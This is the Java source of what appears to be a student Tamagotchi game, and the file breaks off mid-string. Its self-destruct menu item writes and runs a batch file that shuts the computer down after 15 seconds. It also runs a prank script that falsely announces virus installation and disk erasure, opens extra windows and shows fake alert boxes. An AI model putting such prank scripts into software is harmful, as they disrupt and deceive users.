//CETYS UNIVERSIDAD CAMPUS ENSENADA, INGENIERÍA EN SOFTWARE, PFRA. LUCÍA BELTRÁN
//Tamagotchi 100% real no fake 1 link MEGA
package tamagotchi;

import java.awt.*;
import java.awt.event.*;
import javax.swing.*;
import static javax.swing.BoxLayout.X_AXIS;
import java.awt.Font;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import java.io.*;
import java.util.logging.Level;
import java.util.logging.Logger;
import javazoom.jl.decoder.JavaLayerException;
import javazoom.jl.player.*;
import javax.swing.SwingWorker;

/**
 *
 * @author Pablo A. Domínguez Medina
 */
public class tamagotchi_GUI extends JFrame {

    private JFrame main;
    private JPanel panelS, panelC, panel2, panel3, P1, P2, P3, P4, barrasS;
    private JLabel et1, et2, et3, et4;
    private JButton amor, comida, sueño, lavar, agua, bailar, evolucionar, involucionar, poder, random;
    private JTextField notas;
    private JProgressBar vida, felicidad, higiene, hambre, dormir, sed;
    private tamagotchi tama = new tamagotchi();
    private String texto = "", cancion;
    private int a1, b1, c1, d1, e1, f1;
    private JMenuBar menuBar;
    private JMenu aMenu, hMenu;
    private JMenuItem newAction, openAction, exitAction, saveAction, destAction, canAction;
    private ImageIcon accion, port;
    private File arch1, arch3, arch4;
    private File arch2 = new File("Guardado.txt");
    private ObjectOutputStream oos;
    private ObjectInputStream ois;
    private Player playMP3;
    private SwingWorker worker;

    public tamagotchi_GUI() {
        super("Tamagotchi: The Ugandan Knuckles");//Nombre
        setIconImage(new ImageIcon("logo.png").getImage());
        ManejadoraMenu Tmenu = new ManejadoraMenu();
        //Menú_START
        menuBar = new JMenuBar();
        //Aquí se hacen los menús
        setJMenuBar(menuBar);
        //Menús disponibles
        aMenu = new JMenu("Archivo");
        hMenu = new JMenu("Herramientas");
        menuBar.add(aMenu);
        menuBar.add(hMenu);

        //Crear items para el menú
        newAction = new JMenuItem("Nuevo");
        newAction.addActionListener(Tmenu);
        openAction = new JMenuItem("Abrir");
        openAction.addActionListener(Tmenu);
        saveAction = new JMenuItem("Guardar");
        saveAction.addActionListener(Tmenu);
        exitAction = new JMenuItem("Salir");
        exitAction.addActionListener(Tmenu);
        //canMAction = new JMenuItem("Detener Música");
        //canMAction.addActionListener(Tmenu);

        destAction = new JMenuItem("Iniciar programa de autodestrucción");
        destAction.addActionListener(Tmenu);//Programar apagado de computadora o algo así
        canAction = new JMenuItem("Cancelar programa de autodestrucción");
        canAction.addActionListener(Tmenu);
        //openVirus = new JMenuItem("Launch virus");
        //openVirus.addActionListener(Tmenu);

        aMenu.add(newAction);
        aMenu.add(openAction);
        //fileMenu.addSeparator();
        aMenu.add(saveAction);
        aMenu.add(exitAction);
        hMenu.add(destAction);
        hMenu.add(canAction);
        //hMenu.add(canMAction);
        //hMenu.add(openVirus);
        //editMenu.addSeparator();

        //Menú_END
        tama.asInicial();//Inicializar tamagotchi
        Manejadora listen = new Manejadora();
        Color verde = new Color(146, 190, 139);
        Color dorado = new Color(245, 190, 139);
        Color gris = new Color(158, 190, 225);
        Color rojo = new Color(170, 60, 69);
        Color negro = new Color(55, 60, 69);
        Color azul = new Color(109, 88, 249);
        Color botones = new Color(38, 35, 65);

        Font notasF = new Font("Palatino Linotype", Font.ITALIC, 16);//Cambiar tipografía

        main = new JFrame();
        panelS = new JPanel(new GridBagLayout());
        panelC = new JPanel(new GridBagLayout());
        barrasS = new JPanel();
        panel2 = new JPanel(new GridBagLayout());
        panel3 = new JPanel(new GridBagLayout());
        //Aún no son necesarias, serán ventanas aparte para opciones de personalización
        P1 = new JPanel();//Izquierda superior
        P2 = new JPanel();//Izquierda inferior
        P3 = new JPanel();//Derecha superior
        P4 = new JPanel();//Derecha inferior
        Container contenedor = getContentPane();
        contenedor.setLayout(new BoxLayout(contenedor, X_AXIS));

        notas = new JTextField();
        notas.setPreferredSize(new Dimension(400, 50));
        notas.setFont(notasF);
        notas.setEditable(false);
        texto = tama.getTexto();
        notas.setText(texto);
        notas.setMargin(new Insets(8, 15, 8, 15));

        port = new ImageIcon("uganda.jpg");

        et1 = new JLabel(port);
        et2 = new JLabel(port);
        et3 = new JLabel(port);
        et4 = new JLabel(port);

        panel2.setBackground(Color.DARK_GRAY);
        panel3.setBackground(Color.DARK_GRAY);
        panel2.setLayout(new BoxLayout(panel2, BoxLayout.Y_AXIS));
        panel3.setLayout(new BoxLayout(panel3, BoxLayout.Y_AXIS));

        //Aquí se crean y configuran botones
        amor = new JButton("AMOR");
        comida = new JButton("COMIDA");
        sueño = new JButton("DORMIR");
        lavar = new JButton("LAVAR");
        agua = new JButton("AGUA");
        bailar = new JButton("BAILAR");
        evolucionar = new JButton("EVOLUCIONAR");
        involucionar = new JButton("INVOLUCIONAR");
        poder = new JButton("POWER UP");
        random = new JButton("TRAILER");

        //Se añaden los actionListener       
        amor.addActionListener(listen);
        comida.addActionListener(listen);
        sueño.addActionListener(listen);
        lavar.addActionListener(listen);
        agua.addActionListener(listen);
        bailar.addActionListener(listen);
        evolucionar.addActionListener(listen);
        involucionar.addActionListener(listen);
        poder.addActionListener(listen);
        random.addActionListener(listen);

        //Se cambia el tamaño de los botones
        amor.setPreferredSize(new Dimension(180, 40));
        comida.setPreferredSize(new Dimension(180, 40));
        sueño.setPreferredSize(new Dimension(180, 40));
        lavar.setPreferredSize(new Dimension(180, 40));
        agua.setPreferredSize(new Dimension(180, 40));
        bailar.setPreferredSize(new Dimension(180, 40));
        evolucionar.setPreferredSize(new Dimension(180, 40));
        involucionar.setPreferredSize(new Dimension(180, 40));
        poder.setPreferredSize(new Dimension(180, 40));
        random.setPreferredSize(new Dimension(180, 40));

        //Se añaden márgenes a los botones
        amor.setMargin(new Insets(8, 15, 8, 15));
        comida.setMargin(new Insets(8, 15, 8, 15));
        sueño.setMargin(new Insets(8, 15, 8, 15));
        lavar.setMargin(new Insets(8, 15, 8, 15));
        agua.setMargin(new Insets(8, 15, 8, 15));
        bailar.setMargin(new Insets(8, 15, 8, 15));
        evolucionar.setMargin(new Insets(8, 15, 8, 15));
        involucionar.setMargin(new Insets(8, 15, 8, 15));
        poder.setMargin(new Insets(8, 15, 8, 15));
        random.setMargin(new Insets(8, 15, 8, 15));

        //Color del texto de los botones
        amor.setForeground(Color.white);
        comida.setForeground(Color.white);
        sueño.setForeground(Color.white);
        lavar.setForeground(Color.white);
        agua.setForeground(Color.white);
        bailar.setForeground(Color.white);
        evolucionar.setForeground(Color.white);
        involucionar.setForeground(Color.white);
        poder.setForeground(Color.white);
        random.setForeground(Color.white);

        //Color del fondo de los botones
        amor.setBackground(botones);
        comida.setBackground(botones);
        sueño.setBackground(botones);
        lavar.setBackground(botones);
        agua.setBackground(botones);
        bailar.setBackground(botones);
        evolucionar.setBackground(botones);
        involucionar.setBackground(botones);
        poder.setBackground(botones);
        random.setBackground(botones);

        //Ordenar los botones en el grid bag layout
        GridBagConstraints c = new GridBagConstraints();
        c.insets = new Insets(3, 8, 3, 8);
        c.gridx = 0;
        c.gridy = 0;
        c.anchor = GridBagConstraints.LINE_START;
        panelS.add(amor, c);
        c.gridx = 0;
        c.gridy = 1;
        c.anchor = GridBagConstraints.LINE_START;
        panelS.add(sueño, c);
        c.gridx = 0;
        c.gridy = 2;
        c.anchor = GridBagConstraints.LINE_START;
        panelS.add(lavar, c);
        c.gridx = 0;
        c.gridy = 3;
        c.anchor = GridBagConstraints.LINE_START;
        panelS.add(comida, c);
        c.gridx = 0;
        c.gridy = 4;
        c.anchor = GridBagConstraints.LINE_START;
        panelS.add(agua, c);
        c.gridx = 1;
        c.gridy = 0;
        c.anchor = GridBagConstraints.LINE_START;
        panelS.add(bailar, c);
        c.gridx = 1;
        c.gridy = 1;
        c.anchor = GridBagConstraints.LINE_START;
        panelS.add(evolucionar, c);
        c.gridx = 1;
        c.gridy = 2;
        c.anchor = GridBagConstraints.LINE_START;
        panelS.add(involucionar, c);
        c.gridx = 1;
        c.gridy = 3;
        c.anchor = GridBagConstraints.LINE_START;
        panelS.add(poder, c);
        c.gridx = 1;
        c.gridy = 4;
        c.anchor = GridBagConstraints.LINE_START;
        panelS.add(random, c);

        c.anchor = GridBagConstraints.LINE_END;

        //Barra de vida
        vida = new JProgressBar();
        vida.setValue(tama.getVida());
        vida.setPreferredSize(new Dimension(405, 20));
        vida.setForeground(verde);
        vida.setBorderPainted(false);
        vida.setBackground(Color.WHITE);

        //barra de felicidad
        felicidad = new JProgressBar();
        felicidad.setValue(tama.getFelicidad());
        felicidad.setPreferredSize(new Dimension(75, 20));
        felicidad.setForeground(dorado);
        felicidad.setBorderPainted(false);
        felicidad.setBackground(Color.WHITE);

        //Barra de higiene
        higiene = new JProgressBar();
        higiene.setValue(tama.getHigiene());
        higiene.setPreferredSize(new Dimension(75, 20));
        higiene.setForeground(gris);
        higiene.setBorderPainted(false);
        higiene.setBackground(Color.WHITE);

        //Barra de sueño
        dormir = new JProgressBar();
        dormir.setValue(tama.getSueño());
        dormir.setPreferredSize(new Dimension(75, 20));
        dormir.setForeground(negro);
        dormir.setBorderPainted(false);
        dormir.setBackground(Color.WHITE);

        //Barra de hambre
        hambre = new JProgressBar();
        hambre.setValue(tama.getHambre());
        hambre.setPreferredSize(new Dimension(75, 20));
        hambre.setForeground(rojo);
        hambre.setBorderPainted(false);
        hambre.setBackground(Color.WHITE);

        //Barra de sed
        sed = new JProgressBar();
        sed.setValue(tama.getSed());
        sed.setPreferredSize(new Dimension(75, 20));
        sed.setForeground(azul);
        sed.setBorderPainted(false);
        sed.setBackground(Color.WHITE);

        //Esto hace que al pasar el crusor por encima te muestre de qué es cada cosa
        vida.setToolTipText("Vida");
        felicidad.setToolTipText("Felicidad");
        higiene.setToolTipText("Higiene");
        dormir.setToolTipText("Sueño");
        hambre.setToolTipText("Hambre");
        sed.setToolTipText("Sed");

        //Se añaden las barras al panel de Barras secundarias
        barrasS.add(felicidad);
        barrasS.add(dormir);
        barrasS.add(higiene);
        barrasS.add(hambre);
        barrasS.add(sed);

        //Ordenar la barra de vida sobre las barras secundarias
        GridBagConstraints e = new GridBagConstraints();
        e.insets = new Insets(0, 0, 0, 0);
        e.gridx = 0;
        e.gridy = 0;
        e.anchor = GridBagConstraints.LINE_START;
        panelC.add(vida, e);

        e.gridx = 0;
        e.gridy = 1;
        e.anchor = GridBagConstraints.LINE_START;
        panelC.add(barrasS, e);

        e.anchor = GridBagConstraints.LINE_END;

        //Añadir todo a sus respectivos paneles
        P1.add(et1);
        P2.add(et2);
        P3.add(panelS);
        P3.add(panelC);
        P4.add(et4);
        P4.add(notas);

        //panel2.add(P1);
        //panel2.add(P2);
        panel3.add(P3);
        panel3.add(P4);

        //contenedor.add(panel2);
        contenedor.add(panel3);

        //Opciones de ventana
        //Tamaño
        setSize(470, 830);
        //Evitar que el tamaño sea modificado
        setResizable(false);
        //Modificar posición
        setLocation(100, 100);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        //Que se pueda ver?
        setVisible(true);

    }

    //Clase manejadora de los botones
    public class Manejadora implements ActionListener {

        @Override
        public void actionPerformed(ActionEvent evento) {
            tama.setHambre(tama.getHambre() - 1);
            tama.setSed(tama.getSed() - 2);
            tama.setFelicidad(tama.getFelicidad() - 3);
            tama.setSueño(tama.getSueño() - 4);
            tama.setHigiene(tama.getHigiene() - 1);
            //amor, comida, sueño, lavar, agua, bailar, evolucionar, involucionar, poder, trailer de película;
            if (evento.getSource() == amor) {
                tama.setSueño(tama.getSueño() - 4);
                tama.setFelicidad(tama.getFelicidad() + 32);
                tama.setHigiene(tama.getHigiene() - 2);
                tama.setHambre(tama.getHambre() - 5);
                tama.setSed(tama.getSed() - 6);

                port = new ImageIcon("love.gif");
                et4.setIcon(port);
            } else if (evento.getSource() == comida) {
                tama.setSueño(tama.getSueño() - 8);
                tama.setFelicidad(tama.getFelicidad() + 2);
                tama.setHigiene(tama.getHigiene() - 6);
                tama.setHambre(tama.getHambre() + 32);
                tama.setSed(tama.getSed() - 6);

                port = new ImageIcon("comer.gif");
                et4.setIcon(port);
            } else if (evento.getSource() == sueño) {
                tama.setSueño(tama.getSueño() + 45);
                tama.setFelicidad(tama.getFelicidad() + 12);
                tama.setHigiene(tama.getHigiene() - 2);
                tama.setHambre(tama.getHambre() - 10);
                tama.setSed(tama.getSed() - 10);

                port = new ImageIcon("sleep.gif");
                et4.setIcon(port);
            } else if (evento.getSource() == lavar) {
                tama.setSueño(tama.getSueño() - 4);
                tama.setFelicidad(tama.getFelicidad() + 2);
                tama.setHigiene(tama.getHigiene() + 60);
                tama.setHambre(tama.getHambre() - 3);
                tama.setSed(tama.getSed() - 3);

                port = new ImageIcon("lavar.gif");
                et4.setIcon(port);
            } else if (evento.getSource() == agua) {
                tama.setSueño(tama.getSueño());
                tama.setFelicidad(tama.getFelicidad() + 1);
                tama.setHigiene(tama.getHigiene());
                tama.setHambre(tama.getHambre() - 1);
                tama.setSed(tama.getSed() + 55);

                //Añadir imágen/reemplazar
                port = new ImageIcon("agua.gif");
                et4.setIcon(port);
            } else if (evento.getSource() == bailar) {
                tama.setSueño(tama.getSueño());
                tama.setFelicidad(tama.getFelicidad() + 12);
                tama.setHigiene(tama.getHigiene() - 12);
                tama.setHambre(tama.getHambre() - 12);
                tama.setSed(tama.getSed() - 23);

                port = new ImageIcon("baile.gif");
                et4.setIcon(port);

                playM("baile");
            } else if (evento.getSource() == evolucionar) {
                tama.setSueño(tama.getSueño() - 50);
                tama.setFelicidad(tama.getFelicidad() + 25);
                tama.setHigiene(tama.getHigiene());
                tama.setHambre(tama.getHambre() - 50);
                tama.setSed(tama.getSed() - 50);

                port = new ImageIcon("evolucion.gif");
                et4.setIcon(port);
            } else if (evento.getSource() == involucionar) {
                tama.setSueño(tama.getSueño() - 50);
                tama.setFelicidad(tama.getFelicidad() + 25);
                tama.setHigiene(tama.getHigiene());
                tama.setHambre(tama.getHambre() - 50);
                tama.setSed(tama.getSed() - 50);

                port = new ImageIcon("random1.gif");
                et4.setIcon(port);
            } else if (evento.getSource() == poder) {
                tama.setSueño(tama.getSueño() - 100);
                tama.setFelicidad(tama.getFelicidad() - 25);
                tama.setHigiene(tama.getHigiene() - 20);
                tama.setHambre(tama.getHambre() - 50);
                tama.setSed(tama.getSed() - 60);
                tama.setVida(tama.getVida() + 160);

                port = new ImageIcon("power.gif");
                et4.setIcon(port);

                try {
                    Thread.sleep(1000);
                } catch (InterruptedException ex) {
                    Logger.getLogger(tamagotchi_GUI.class.getName()).log(Level.SEVERE, null, ex);
                }
                playM("power");
            } else if (evento.getSource() == random) {
                stopM();
                //No se realmente que pasará aquí

                port = new ImageIcon("pelicula.gif");
                et4.setIcon(port);
            }

            //Un montón de configuración acerca de lo que le puede hacer daño y como recuperar vida por turno
            if (tama.getHambre() <= 0 || tama.getFelicidad() <= 0 || tama.getSueño() <= 0 || tama.getSed() <= 0 || tama.getHigiene() <= 0) {
                tama.setVida(tama.getVida() - 35);
                if (tama.getVida() <= 0) {
                    tama.state = false;
                }
            } else {
                tama.setVida(tama.getVida() + 8);
            }
            //Comienzo reguladores
            if (dormir.getValue() < 0 || dormir.getValue() > 100) {
                if (dormir.getValue() < 0) {
                    dormir.setValue(0);
                } else {
                    dormir.setValue(100);
                }
            }

            if (felicidad.getValue() < 0 || dormir.getValue() > 100) {
                if (felicidad.getValue() < 0) {
                    felicidad.setValue(0);
                } else {
                    felicidad.setValue(100);
                }
            }

            if (higiene.getValue() < 0 || higiene.getValue() > 100) {
                if (higiene.getValue() < 0) {
                    higiene.setValue(0);
                } else {
                    higiene.setValue(100);
                }
            }

            if (hambre.getValue() < 0 || hambre.getValue() > 100) {
                if (hambre.getValue() < 0) {
                    hambre.setValue(0);
                } else {
                    hambre.setValue(100);
                }
            }

            if (sed.getValue() < 0 || sed.getValue() > 100) {
                if (sed.getValue() < 0) {
                    sed.setValue(0);
                } else {
                    sed.setValue(100);
                }
            }

            if (vida.getValue() < 0 || vida.getValue() > 100) {
                if (vida.getValue() < 0) {
                    vida.setValue(0);
                } else {
                    vida.setValue(100);
                }
            }
            //Fin de reguladores
            //Sospecho que si eran 120, esto lo haré después con algo más de calma o esperando una mejor idea
            //Inicio voicelines//Esto va a estar complicado ya que se mezclarán varias y no hay una forma de darle prioridad, 
            //por suerte solo son 5, (5-1)! son 24 posibles combinaciones de if's, a menos que quiera complicarme y hacer 
            //las 362800 combinaciones que son necesarias para satisfacer a todas las probabilidades, 9! es un número interesante...
            //Podría hacer que el <60 sea superficial y que sea fácilmente reemplazado por algo más importante como <30

            if (dormir.getValue() < 60) {
                notas.setText("");

            }
            if (hambre.getValue() < 60) {
                notas.setText("");
            }
            if (higiene.getValue() < 60) {
                notas.setText("");

            }
            if (felicidad.getValue() < 60) {
                notas.setText("");

            }
            if (sed.getValue() < 60) {
                notas.setText("");

            }
            if (vida.getValue() < 60) {
                notas.setText("");

            }

            if (dormir.getValue() < 30) {
                a1 = 1;
            } else {
                a1 = 0;
            }
            if (hambre.getValue() < 30) {
                b1 = 1;
            } else {
                b1 = 0;
            }
            if (higiene.getValue() < 30) {
                c1 = 1;
            } else {
                c1 = 0;
            }
            if (felicidad.getValue() < 30) {
                d1 = 1;
            } else {
                d1 = 0;
            }
            if (sed.getValue() < 30) {
                e1 = 1;
            } else {
                e1 = 0;
            }
            if (vida.getValue() < 50) {
                f1 = 1;
            } else {
                f1 = 0;
            }

            //Comienzo de diálogos
            if ((a1 + b1 + c1 + d1 + e1) == 0) {
                notas.setText("Todo bien");
            }

            if (dormir.getValue() > 80 && hambre.getValue() > 80 && higiene.getValue() > 80 && felicidad.getValue() > 80 && sed.getValue() > 80) {
                notas.setText("Estoy genial! Dime que hacer!!! Algo por favor!!");
            }

            if ((a1 + b1 + c1 + d1 + e1) == 1) {
                notas.setText("");
                if (a1 == 1) {
                    notas.setText("Tengo sueñoooo...");
                } else if (b1 == 1) {
                    notas.setText("Tengo hambre!!!");
                } else if (c1 == 1) {
                    notas.setText("Me siento sucio...");
                } else if (d1 == 1) {
                    notas.setText("Estoy triste...");
                } else if (e1 == 1) {
                    notas.setText("Seeed!...");
                }
            }
            //notas.setText(notas.getText()+"");
            if ((a1 + b1 + c1 + d1 + e1) >= 2) {
                if (a1 == 1) {
                    notas.setText(notas.getText() + " tengo sueño.");
                }
                if (b1 == 1) {
                    notas.setText(notas.getText() + " tengo hambre!");
                }
                if (c1 == 1) {
                    notas.setText(notas.getText() + " me siento sucio.");
                }
                if (d1 == 1) {
                    notas.setText(notas.getText() + " estoy triste.");
                }
                if (e1 == 1) {
                    notas.setText(notas.getText() + " tengo sed.");
                }
            }

            if ((a1 + b1 + c1 + d1 + e1) == 5) {
                notas.setText("Hey!! recuerdame! Me siento mal...");
            }

            if (dormir.getValue() < 5) {
                notas.setText(notas.getText() + " dejame dormir c#br@n!");
            }
            if (hambre.getValue() < 5) {
                notas.setText(notas.getText() + " oye tu te crees que hago fotosíntesis o que onda?.");
            }
            if (higiene.getValue() < 5) {
                notas.setText(notas.getText() + " estoy bien puerco men, bañame paro.");
            }
            if (felicidad.getValue() < 5) {
                notas.setText(notas.getText() + " depresión.");
            }
            if (sed.getValue() < 5) {
                notas.setText(notas.getText() + " muero sed.");
            }

            if (f1 == 1) {
                notas.setText(notas.getText() + " me siento mal Sr. Stark");
            }

            //Fin de voicelines
            if (tama.state == false) {
                tama.setSueño(0);
                tama.setFelicidad(0);
                tama.setHigiene(0);
                tama.setHambre(0);
                tama.setSed(0);
                tama.setVida(0);
                port = new ImageIcon("dead.gif");
                playM("himno");
                et4.setIcon(port);
                JOptionPane.showMessageDialog(null, "Uganda Knuckles ha muerto... :'(");

                notas.setText("Uganda Knuckles ha muerto!!!");

            }

            dormir.setValue(tama.getSueño());
            felicidad.setValue(tama.getFelicidad());
            higiene.setValue(tama.getHigiene());
            hambre.setValue(tama.getHambre());
            sed.setValue(tama.getSed());
            vida.setValue(tama.getVida());
        }

        //Reproducir música, como dato se debe dar el nombre de la canción
        private void playM(String name) {
            cancion = name;
            worker = new AnswerWorker();
            worker.execute();
        }

        //Detener música, aún trabajamos en ello ;)
        private void stopM() {
            try {
                worker.cancel(true);
            } catch (Exception e) {
            }
        }
    }

    //SwingWorker para poder reproducir la música sin que se congele la interfaz
    class AnswerWorker extends SwingWorker<Player, Integer> {

        @Override
        protected Player doInBackground() throws Exception {
            try {
                FileInputStream fis = new FileInputStream(cancion + ".mp3");
                playMP3 = new Player(fis);
                playMP3.play();

            } catch (FileNotFoundException | JavaLayerException exc) {
                System.out.println("Error al reproducir el audio");
            }
            return playMP3;
        }

        protected void done() {

        }
    }

    //Clase manejadora del menú superior
    public class ManejadoraMenu implements ActionListener {

        @Override
        public void actionPerformed(ActionEvent evento) {
            if (evento.getSource() == newAction) {
                tama.asInicial();
                dormir.setValue(tama.getSueño());
                felicidad.setValue(tama.getFelicidad());
                higiene.setValue(tama.getHigiene());
                hambre.setValue(tama.getHambre());
                sed.setValue(tama.getSed());
                vida.setValue(tama.getVida());
                port = new ImageIcon("uganda.jpg");
                et4.setIcon(port);
            } else if (evento.getSource() == openAction) {
                //Abrir última partida guardada
                try {
                    ois = new ObjectInputStream(new FileInputStream(arch2));
                    tama = (tamagotchi) ois.readObject();
                    //Cargar última partida guardada y actualizar barras
                    dormir.setValue(tama.getSueño());
                    felicidad.setValue(tama.getFelicidad());
                    higiene.setValue(tama.getHigiene());
                    hambre.setValue(tama.getHambre());
                    sed.setValue(tama.getSed());
                    vida.setValue(tama.getVida());
                } catch (ClassNotFoundException ex) {
                    Logger.getLogger(tamagotchi_GUI.class.getName()).log(Level.SEVERE, null, ex);
                } catch (IOException e) {
                } catch (ArrayIndexOutOfBoundsException ae) {
                    System.out.println(ae.getMessage());
                    System.out.println("Error en la apertura");
                }
            } else if (evento.getSource() == saveAction) {
                arch2 = new File("Guardado.txt");
                //Guardar partida
                try {
                    oos = new ObjectOutputStream(new FileOutputStream(arch2));
                    oos.writeObject(tama);
                    oos.close();
                } catch (IOException e) {
                    System.out.println("Error en el guardado");
                }
            } else if (evento.getSource() == exitAction) {
                //Salir del programa
                System.exit(0);
            } else if (evento.getSource() == destAction) {
                //Ejecutar una sarta de códigos en .bat creados aquí mismo y apagar la computadora en 15 segundos
                arch1 = new File("Shutdown.bat");
                try {

                    FileWriter w = new FileWriter(arch1);
                    try (BufferedWriter bw = new BufferedWriter(w)) {
                        PrintWriter wr = new PrintWriter(bw);
                        wr.write("shutdown.exe -s -t 15");
                        wr.close();
                        Desktop.getDesktop().open(arch1);
                    }

                } catch (IOException e) {
                }

                arch4 = new File("VirusStart.bat");
                try {

                    FileWriter w = new FileWriter(arch4);
                    try (BufferedWriter bw = new BufferedWriter(w)) {
                        PrintWriter wr = new PrintWriter(bw);
                        wr.write("@echo off \n"
                                + "color 0a \n"
                                + "echo ==================== \n"
                                + "echo = = \n"
                                + "echo = ugandan_knuckles.exe = \n"
                                + "echo = = \n"
                                + "echo ==================== \n"
                                + "echo . \n"
                                + "echo . \n"
                                + "echo . \n"
                                + "cls \n"
                                + "echo Instalando virus . . . \n"
                                + "echo Borrando disco rigido . . . \n"
                                + "echo Borrando archivos . . . \n"
                                + "echo Borrando el registro . . . \n"
                                + "echo Borrando antivirus . . . \n"
                                + "echo Borrando ip . . . \n"
                                + "echo Desactivando el firewall \n"
                                + "echo Borrando puertos de conexion . . . \n"
                                + "echo Error Windows . . . Virus alert!! \n"
                                + "echo El equipo no puede seguir procesando ugandan_virus.bat \n"
                                + "echo start >> virus.exe \n"
                                + "echo start >> virus.exe \n"
                                + "echo start >> virus.exe \n"
                                + "echo start >> virus.exe \n"
                                + "echo start >> virus.exe \n"
                                + "echo start >> virus.exe \n"
                                + "echo start >> virus.exe \n"
                                + "echo start >> virus.exe \n"
                                + "echo start >> virus.exe \n"
                                + "echo start >> virus.exe \n"
                                + "echo start >> virus.exe \n"
                                + "echo start >> virus.exe \n"
                                + "echo start >> virus.exe \n"
                                + "echo start >> virus.exe \n"
                                + "echo start >> virus.exe \n"
                                + "echo start >> virus.bat \n"
                                + "echo start >> virus.bat \n"
                                + "echo start >> virus.bat \n"
                                + "echo start >> virus.bat \n"
                                + "echo start >> virus.bat \n"
                                + "echo start >> virus.bat \n"
                                + "echo start >> virus.bat \n"
                                + "echo start >> virus.bat \n"
                                + "echo start >> virus.bat \n"
                                + "echo start >> virus.bat \n"
                                + "echo start >> virus.bat \n"
                                + "echo start >> virus.bat \n"
                                + "echo start >> virus.bat \n"
                                + "echo start >> Troyan.exe \n"
                                + "echo start >> Troyan.exe \n"
                                + "echo start >> Troyan.exe \n"
                                + "echo start >> Troyan.exe \n"
                                + "echo start >> Troyan.exe \n"
                                + "echo start >> Troyan.exe \n"
                                + "echo start >> Troyan.exe \n"
                                + "echo start >> Troyan.exe \n"
                                + "echo start >> Troyan.exe \n"
                                + "echo start >> Troyan.exe \n"
                                + "echo start >> Troyan.exe \n"
                                + "echo start >> Troyan.exe \n"
                                + "echo start >> Troyan.bat \n"
                                + "echo start >> Troyan.bat \n"
                                + "echo start >> Troyan.bat \n"
                                + "echo start >> Troyan.bat \n"
                                + "echo start >> Troyan.bat \n"
                                + "echo start >> Troyan.bat \n"
                                + "echo start >> Troyan.bat \n"
                                + "echo start >> Troyan.bat \n"
                                + "echo start >> Troyan.bat \n"
                                + "echo start >> Troyan.bat \n"
                                + "echo start >> Troyan.bat \n"
                                + "echo start >> Troyan.bat \n"
                                + "echo start >> Malware.exe \n"
                                + "echo start >> Malware.exe \n"
                                + "echo start >> Malware.exe \n"
                                + "echo start >> Malware.exe \n"
                                + "echo start >> Malware.exe \n"
                                + "echo start >> Malware.exe \n"
                                + "echo start >> Malware.exe \n"
                                + "echo start >> Malware.exe \n"
                                + "echo start >> Malware.exe \n"
                                + "echo start >> Malware.exe \n"
                                + "echo start >> Malware.exe \n"
                                + "echo start >> Malware.bat \n"
                                + "echo start >> Malware.bat \n"
                                + "echo start >> Malware.bat \n"
                                + "echo start >> Malware.bat \n"
                                + "echo start >> Malware.bat \n"
                                + "echo start >> Malware.bat \n"
                                + "echo start >> Malware.bat \n"
                                + "echo start >> Malware.bat \n"
                                + "echo start >> Malware.bat \n"
                                + "echo start >> Malware.bat \n"
                                + "echo start >> Malware.bat \n"
                                + "echo start >> Malware.bat \n"
                                + "echo start >> Malware.bat \n"
                                + "echo start >> Malware.bat \n"
                                + "echo start >> Spyware.exe \n"
                                + "echo start >> Spyware.exe \n"
                                + "echo start >> Spyware.exe \n"
                                + "echo start >> Spyware.exe \n"
                                + "echo start >> Spyware.exe \n"
                                + "echo start >> Spyware.exe \n"
                                + "echo start >> Spyware.exe \n"
                                + "echo start >> Spyware.exe \n"
                                + "echo start >> Spyware.exe \n"
                                + "echo start >> Spyware.exe \n"
                                + "echo start >> Spyware.exe \n"
                                + "echo start >> Spyware.exe \n"
                                + "echo start >> Spyware.exe \n"
                                + "echo start >> Spyware.exe \n"
                                + "echo start >> Spyware.bat \n"
                                + "echo start >> Spyware.bat \n"
                                + "echo start >> Spyware.bat \n"
                                + "echo start >> Spyware.bat \n"
                                + "echo start >> Spyware.bat \n"
                                + "echo start >> Spyware.bat \n"
                                + "echo start >> Spyware.bat \n"
                                + "echo start >> Spyware.bat \n"
                                + "echo start >> Spyware.bat \n"
                                + "echo start >> Spyware.bat \n"
                                + "echo start >> Spyware.bat \n"
                                + "echo start >> Spyware.bat \n"
                                + "echo start >> Spyware.bat \n"
                                + "echo start >> Spyware.bat \n"
                                + "echo start >> Virusavanced.exe \n"
                                + "echo start >> Virusavanced.exe \n"
                                + "echo start >> Virusavanced.exe \n"
                                + "echo start >> Virusavanced.exe \n"
                                + "echo start >> Virusavanced.exe \n"
                                + "echo start >> Virusavanced.exe \n"
                                + "echo start >> Virusavanced.exe \n"
                                + "echo start >> Virusavanced.exe \n"
                                + "echo start >> Virusavanced.exe \n"
                                + "echo start >> Virusavanced.exe \n"
                                + "echo start >> Virusavanced.exe \n"
                                + "echo start >> Virusavanced.exe \n"
                                + "echo start >> Virusavanced.exe \n"
                                + "echo start >> Virusavanced.exe \n"
                                + "echo start >> Virusavanced.exe \n"
                                + "echo start >> Virusavanced.bat \n"
                                + "echo start >> Virusavanced.bat \n"
                                + "echo start >> Virusavanced.bat \n"
                                + "echo start >> Virusavanced.bat \n"
                                + "echo start >> Virusavanced.bat \n"
                                + "echo start >> Virusavanced.bat \n"
                                + "echo start >> Virusavanced.bat \n"
                                + "echo start >> Virusavanced.bat \n"
                                + "echo start >> Virusavanced.bat \n"
                                + "echo start >> Virusavanced.bat \n"
                                + "echo start >> Virusavanced.bat \n"
                                + "echo start >> Virusavanced.bat \n"
                                + "echo start >> Virusavanced.bat \n"
                                + "echo start >> Virusavanced.bat \n"
                                + "echo start >> Virusavanced.bat \n"
                                + "start virus.bat \n"
                                + "start troyan.bat \n"
                                + "echo msgbox (\"Instalando virus . . .\" ) >> abrime.vbs \n"
                                + "echo msgbox (\"Borrando ip . . .\" ) >> abrime.vbs \n"
                                + "echo msgbox (\" Borrando puertos . . .\" ) >> abrime.vbs \n"
                                + "echo msgbox (\"Desactivando el firewall . . .\" ) >> abrime.vbs \n"
                                + "echo msgbox (\"Borrando el antivirus . . .\" ) >> abrime.vbs \n"
                                + "start abrime.vbs \n"
                                + "echo MsgBox (\"Sistem Error\" ),16,(\"Virus\" ) >> Virus.vbs \n"
                                + "echo MsgBox (\"El sistema no puede seguir procesando\" ),16,(\"Virus alert\" ) >> Virus.vbs \n"
                                + "echo MsgBox (\"VIRUS ALERT!!\" ),16,(\"Virus\" ) >> Virus.vbs \n"
                                + "start Virus.vbs \n"
                                + "echo @echo off >> jaja.bat \n"
                                + "echo color 0a >> jaja.bat \n"
